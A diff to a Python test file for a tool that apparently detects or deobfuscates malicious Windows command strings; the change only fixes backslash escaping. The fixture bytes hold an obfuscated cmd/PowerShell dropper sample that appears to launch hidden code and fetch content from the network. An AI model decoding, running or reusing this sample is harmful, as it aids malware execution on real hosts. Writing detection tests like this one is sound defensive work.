@@ -120,14 +120,14 @@ def test_find_cmd_strings_with_combo_of_ps1_and_cmd():
             b'"rzSk=8" &&!0j0kF9ei! "vyxM=v" &&!0j0kF9ei! "vdCD=\'" &&!0j0kF9ei! "BdIj=P" &&!0j0kF9ei! "RBjV=h" '
             b'&&!0j0kF9ei! "FKko=Q" &&!0j0kF9ei! "peOc=/" &&!0j0kF9ei! "vgth=G" &&!0j0kF9ei! "GyGT=T" &&!0j0kF9ei! '
             b'"sHzK=M" &&!0j0kF9ei! "mSxW=y" &&!0j0kF9ei! "wasV=S" &&c!fqvE!l!duPA! !0j0kF9ei! '
-            b'"de1R8TKC=%!CWUz!!kAoe!p!KxCF!\!eOTw!!Upvl!!bntB!!PbiW!!eOTw!!RDvi!!eOTw!!CWUz!.!Upvl!!swJc!e" '
-            b'&& c!fqvE!!duPA!!duPA! !0j0kF9ei! "6vIlvFDq=%t!kAoe!!yYGa!%\!eOTw!!Upvl!!PbiW!!eOTw!!RDvi!!eOTw!t!ozfF!'
+            b'"de1R8TKC=%!CWUz!!kAoe!p!KxCF!\\!eOTw!!Upvl!!bntB!!PbiW!!eOTw!!RDvi!!eOTw!!CWUz!.!Upvl!!swJc!e" '
+            b'&& c!fqvE!!duPA!!duPA! !0j0kF9ei! "6vIlvFDq=%t!kAoe!!yYGa!%\\!eOTw!!Upvl!!PbiW!!eOTw!!RDvi!!eOTw!t!ozfF!'
             b'!eOTw!n!yqwP!" && (for %t in ("!bnwz!v!Upvl!!AAVs!!HUXA!!eOTw!!TRHb!!RDvi!!jJxO!" "!HUXA!!eOTw!!euru!!RDvi!'
             b'!fqvE!!CWUz!u!AAVs!e = $w!eOTw!!RDvi!!LzmN!o!ETOj!s nt!DePj!" "!bnwz!!LzmN!e!HUXA!ti!RDvi!a!CWUz!i!TRHb'
             b'!!RDvi!!LzmN!!eOTw!!AAVs!!HUXA!]" "!KHMe!!bntB!5!xJuY!!vyxK!!zCOe!!qEyT!" "[!LzmN!!Upvl!f!fqvE!!PbiW!l!CWUz'
             b'!!eOTw!n!HUXA!tal!duPA!!ozfF!w!eOTw!n!LzmN!ow!HUXA!!yPRu!!jJxO!" "!NXuW!nR!Upvl!!euru!i!HUXA!!CWUz!e!AAVs'
             b'!!XBrv!!AQAM!!ADgJ!s!vyxK!F0!yPRu!F!efpU!" "d!Upvl!!duPA!!yqwP!i!duPA!!Upvl!s!vyxK!!KHMe!45!xJuY!" "!bnwz'
-            b'!!lGTl!!zCOe!7!lGTl!!efpU!!jJxO!" "!KxCF!!FPxK!!RfYF!M!yPRu!!LzmN!%!KxCF!!qEyT!!qEyT!%\s!VWtg!!KxCF!!qZpa'
+            b'!!lGTl!!zCOe!7!lGTl!!efpU!!jJxO!" "!KxCF!!FPxK!!RfYF!M!yPRu!!LzmN!%!KxCF!!qEyT!!qEyT!%\\s!VWtg!!KxCF!!qZpa'
             b"!FSP!efpU!%!ijwe!N!bIbp!!ijwe!h!CWUz!!KxCF!!yYGa!!bntB!I!yqwP!!bboR!!KxCF!!CJhg!!KxCF!!yqwP!hwQ!EwIP!%!yPRu"
             b'!!GMSj!.!qZpa!!ozfF!!bntB!!csVL!.!qEyT!9/!AAVs!o!dCLG!o!CWUz!in!euru!!ozfF!!KxCF!!CWUz!!rzSk!GcT!KxCF!" '
             b'"!bnwz!A!bntB!!qZpa!!xJuY!!jJxO!" "!eOTw!!Upvl!!PbiW!!eOTw!!RDvi!!KxCF!!KHMe!y!eOTw!!PbiW!!RfYF!!KxCF!!RDvi'
@@ -136,8 +136,8 @@ def test_find_cmd_strings_with_combo_of_ps1_and_cmd():
             b'TRHb!!dCLG!!FPxK!" "p!bntB!I!yqwP!!bboR!!vyxK!tp" "!yqwP!!RBjV!w!FKko!!EwIP!!vyxK!/!peOc!" "!CWUz!!rzSk'
             b'!!vgth!c!GyGT!!vyxK!!yYGa!h!yYGa!" "!FPxK!!RfYF!!sHzK!!yPRu!!LzmN!=" "!KHMe!!mSxW!!eOTw!u!RfYF!=!eOTw!!CWUz'
             b'!!ozfF!i" ) do @e!VWtg!!RBjV!o %~t)> "!6vIlvFDq!" && call c!TRHb!!yYGa!!mSxW! /Y %!ETOj!!eOTw!!RDvi!d!eOTw'
-            b"!!AAVs!%\!wasV!!mSxW!!HUXA!t!Upvl!!kAoe!3!GMSj!\!eOTw!!Upvl!4!PbiW!i!RDvi!!eOTw!!CWUz!!ozfF!!Upvl!x!Upvl! "
-            b'%!CWUz!!kAoe!!yYGa!%\ && s!CWUz!!fqvE!!AAVs!t "" /m!eOTw!!RDvi! "!de1R8TKC!" -!dCLG!!fqvE!!HUXA!!Upvl!!HUXA'
+            b"!!AAVs!%\\!wasV!!mSxW!!HUXA!t!Upvl!!kAoe!3!GMSj!\\!eOTw!!Upvl!4!PbiW!i!RDvi!!eOTw!!CWUz!!ozfF!!Upvl!x!Upvl! "
+            b'%!CWUz!!kAoe!!yYGa!%\\ && s!CWUz!!fqvE!!AAVs!t "" /m!eOTw!!RDvi! "!de1R8TKC!" -!dCLG!!fqvE!!HUXA!!Upvl!!HUXA'
             b'!!Upvl!!CWUz!!CWUz!!eOTw!n!euru!!HUXA!"'
         ),
     ],
